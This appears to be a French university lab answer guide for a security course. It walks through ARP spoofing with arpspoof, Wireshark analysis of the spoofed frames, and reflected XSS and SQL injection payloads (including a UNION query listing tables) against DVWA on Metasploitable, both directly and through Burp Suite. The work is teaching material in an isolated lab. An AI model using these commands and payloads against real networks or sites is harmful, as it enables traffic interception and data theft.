# Mini-Projet 3 – Réponses & Guide Pratique
**Cours : Sécurité des Systèmes d'Information – ECE 2025-2026**

---

## Architecture utilisée

| Machine | Rôle | IP (exemple) |
|---------|------|--------------|
| Kali Linux (clem) | Attaquant + Analyseur | 192.168.1.50 |
| Metasploitable 2 | Victime | 192.168.1.101 |

> La VM Metasploitable est indispensable pour les parties 3A, 3C et 3D.
> Elle se télécharge sur : https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
> Identifiants : `msfadmin` / `msfadmin`

---

## Partie 3A – ARP Spoofing

### Réponse

L'attaque ARP spoofing nécessite au moins deux machines sur le même réseau. On utilise Kali comme attaquant et Metasploitable comme victime.

**1. Installation des outils sur Kali**
```bash
sudo apt install dsniff net-tools -y
```

**2. Vérifier la connectivité et noter les IPs**
```bash
ip addr                        # noter l'interface (ex: eth0) et l'IP de Kali
ping 192.168.1.101             # vérifier que Metasploitable répond
route -n                       # noter l'IP de la passerelle (ex: 192.168.1.1)
```

**3. Vérifier le cache ARP AVANT l'attaque (sur Kali)**
```bash
arp -a
# Noter l'adresse MAC associée à l'IP de la passerelle — c'est la MAC légitime
```

**4. Lancer l'attaque ARP spoofing**

Ouvrir **deux terminaux** sur Kali :

Terminal 1 — se faire passer pour la passerelle auprès de Metasploitable :
```bash
sudo arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
```

Terminal 2 — se faire passer pour Metasploitable auprès de la passerelle :
```bash
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
```

> 📸 *[Insérer ici : screenshot des deux terminaux arpspoof en cours d'exécution]*

**5. Vérification depuis Metasploitable**

Se connecter à Metasploitable (dans un terminal ou via la console VM) :
```bash
arp -a
# L'IP de la passerelle doit maintenant avoir la MAC de Kali → cache empoisonné
```

> 📸 *[Insérer ici : screenshot de `arp -a` sur Metasploitable montrant la MAC de Kali associée à l'IP passerelle]*

**Pourquoi ?** ARP n'a aucun mécanisme d'authentification : n'importe qui peut envoyer une réponse ARP non sollicitée. Kali se place en **Man-in-the-Middle** entre Metasploitable et la passerelle, interceptant tout le trafic qui passe entre eux.

---

## Partie 3B – Capture et analyse avec Wireshark

### Réponse

Wireshark tourne directement sur Kali pendant que l'attaque ARP est active.

**1. Lancer Wireshark sur Kali**
```bash
sudo wireshark
```
Sélectionner l'interface réseau connectée au réseau (ex: `eth0`), cliquer sur l'icône de capture.

**2. Relancer l'attaque ARP en parallèle**

Dans deux terminaux séparés, relancer les commandes arpspoof de la partie 3A pendant que Wireshark capture.

**3. Filtres Wireshark utiles**

Taper dans la barre de filtre puis appuyer sur Entrée :

| Filtre | Description |
|--------|-------------|
| `arp` | Toutes les trames ARP |
| `arp.opcode == 1` | Requêtes ARP uniquement |
| `arp.opcode == 2` | Réponses ARP uniquement |
| `arp.src.proto_ipv4 == 192.168.1.50` | Trames ARP envoyées par Kali (l'attaquant) |
| `arp.dst.proto_ipv4 == 192.168.1.101` | Trames ARP ciblant Metasploitable |

**4. Analyser une trame ARP spoofée**

Sélectionner une trame ARP reply dans la liste. Dans le panneau du bas, identifier :
- **Sender MAC** : adresse MAC de Kali (l'attaquant)
- **Sender IP** : adresse IP de la passerelle (`192.168.1.1`)
- → Metasploitable reçoit "la passerelle a la MAC de Kali" → cache empoisonné

> 📸 *[Insérer ici : screenshot Wireshark avec filtre `arp.opcode == 2` et détails d'une trame spoofée visible dans le panneau inférieur]*

**5. Arrêter la capture et sauvegarder (optionnel)**
```bash
# Dans Wireshark : File → Save As → capture_arp.pcap
```

**Pourquoi ?** Wireshark capture au niveau de la couche 2 (liaison). On voit clairement les réponses ARP frauduleuses : une même IP (passerelle) associée à une MAC différente de la légitime — c'est la preuve de l'empoisonnement.

---

## Partie 3C – Exploitation XSS & Injection SQL (DVWA sur Metasploitable)

### Réponse

**1. Accéder au DVWA depuis Kali**

Ouvrir Firefox sur Kali et aller à :
```
http://192.168.1.101/dvwa/
```
- Login : `admin`
- Mot de passe : `password`

Aller dans **DVWA Security** → mettre le niveau à **Low** → cliquer Submit.

> 📸 *[Insérer ici : screenshot de la page d'accueil DVWA avec le niveau "Low" configuré]*

**2. Exploitation XSS (Cross-Site Scripting)**

Dans le menu gauche, cliquer sur **XSS (Reflected)**.

Dans le champ "What's your name?", entrer :

Payload basique — afficher une alerte :
```html
<script>alert("XSS");</script>
```

Cliquer sur **Submit** → une alerte JavaScript apparaît dans le navigateur.

> 📸 *[Insérer ici : screenshot de l'alerte JavaScript "XSS" dans Firefox]*

Payload bonus — redirection :
```html
<script>window.location='http://www.google.com';</script>
```

**Pourquoi ça marche ?** L'application réinjecte directement le contenu du champ dans la page HTML sans filtrer. Le navigateur interprète le `<script>` comme du code légitime. En conditions réelles, cela permet de voler des cookies de session ou rediriger vers un site malveillant.

**3. Exploitation Injection SQL**

Dans le menu gauche, cliquer sur **SQL Injection**.

Dans le champ "User ID", entrer :

Payload basique — afficher tous les utilisateurs :
```sql
1' or '1'='1
```
Cliquer sur **Submit** → toutes les entrées de la base de données s'affichent.

> 📸 *[Insérer ici : screenshot du DVWA affichant tous les utilisateurs suite à l'injection]*

Payload avancé — afficher le nom des tables :
```sql
1' union select table_name,2 from information_schema.tables where table_schema = database()#
```

**Pourquoi ça marche ?** La requête SQL interne ressemble à `SELECT * FROM users WHERE id='$input'`. En injectant `1' or '1'='1`, la condition devient toujours vraie et retourne toutes les lignes. L'entrée utilisateur n'est jamais validée ni échappée.

---

## Partie 3D – Test avec Burp Suite

### Réponse

Tout se fait sur Kali, avec Firefox configuré pour passer par Burp Suite.

**1. Lancer Burp Suite**
```bash
burpsuite
```
Choisir **Temporary project** → Next → **Start Burp**.

**2. Configurer le proxy dans Firefox**

Firefox → Settings → chercher "proxy" → **Manual proxy configuration** :
- HTTP Proxy : `127.0.0.1`
- Port : `8080`
- Cocher **"Use this proxy server for all protocols"**
- Cliquer OK

> 📸 *[Insérer ici : screenshot de la configuration proxy Firefox]*

**3. Installer le certificat Burp dans Firefox**

Aller sur `http://burp` dans Firefox → cliquer **CA Certificate** pour télécharger.

Firefox → Settings → chercher "certificates" → **View Certificates** → onglet **Authorities** → **Import** → sélectionner le fichier téléchargé → cocher **"Trust this CA to identify websites"** → OK.

**4. Intercepter une requête**

Dans Burp Suite : onglet **Proxy** → s'assurer que **"Intercept is on"** est activé (bouton bleu).

Naviguer sur `http://192.168.1.101/dvwa/` dans Firefox → les requêtes apparaissent dans Burp.

> 📸 *[Insérer ici : screenshot d'une requête HTTP interceptée dans l'onglet Proxy de Burp Suite]*

**5. Tester l'injection SQL via le Repeater**

Sur la page SQL Injection du DVWA, entrer `1` et cliquer Submit.

Dans Burp → clic droit sur la requête interceptée → **Send to Repeater**.

Dans l'onglet **Repeater**, localiser le paramètre `id` dans la requête et le modifier :
```
id=1'+or+'1'%3D'1
```
Cliquer **Send** → la réponse à droite affiche tous les utilisateurs.

> 📸 *[Insérer ici : screenshot du Repeater avec la requête modifiée et la réponse du serveur]*

**6. Tester XSS via le Repeater**

Sur la page XSS (Reflected) du DVWA, entrer un nom et cliquer Submit.

Envoyer la requête au Repeater, modifier le paramètre `name` :
```
name=<script>alert('XSS')</script>
```
Cliquer **Send** → la réponse HTML contient le script injecté.

**7. Désactiver le proxy après les tests**

Firefox → Settings → proxy → **Use system proxy settings**
(sinon tu perds l'accès internet)

**Pourquoi ?** Burp Suite agit comme un proxy intermédiaire entre Firefox et le serveur. Il permet d'intercepter, modifier et rejouer chaque requête HTTP — technique fondamentale du pentest web pour manipuler des paramètres normalement cachés.

---

## Récapitulatif des commandes essentielles

| Partie | Commande / Action | Rôle |
|--------|-------------------|------|
| 3A | `sudo apt install dsniff -y` | Installer arpspoof |
| 3A | `sudo arpspoof -i eth0 -t 192.168.1.101 192.168.1.1` | Empoisonner le cache ARP de Metasploitable |
| 3A | `sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.101` | Empoisonner le cache ARP de la passerelle |
| 3A | `arp -a` (sur Metasploitable) | Vérifier le cache ARP empoisonné |
| 3B | `sudo wireshark` | Lancer Wireshark sur Kali |
| 3B | Filtre : `arp` | Isoler les trames ARP |
| 3B | Filtre : `arp.opcode == 2` | Afficher uniquement les réponses ARP |
| 3C | `<script>alert("XSS");</script>` | Payload XSS basique |
| 3C | `1' or '1'='1` | Payload injection SQL |
| 3D | `burpsuite` | Lancer Burp Suite |
| 3D | Proxy Firefox : `127.0.0.1:8080` | Rediriger le trafic vers Burp |
| 3D | Clic droit → Send to Repeater | Modifier et rejouer une requête |
